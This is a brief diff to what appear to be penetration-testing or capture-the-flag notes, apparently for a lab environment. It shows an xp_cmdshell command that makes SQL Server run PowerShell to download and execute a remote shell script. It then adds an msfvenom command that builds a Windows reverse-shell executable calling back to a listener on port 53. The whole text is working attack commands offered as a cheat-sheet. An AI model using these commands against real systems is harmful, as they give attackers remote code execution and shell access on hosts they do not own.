@@ -25,3 +25,9 @@ save the shell.ps1 file. then using the python to download
 From the sql cmd: 
 
 xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");"
+
+# msf venom
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=53 -f exe -o reverse64.exe
+```
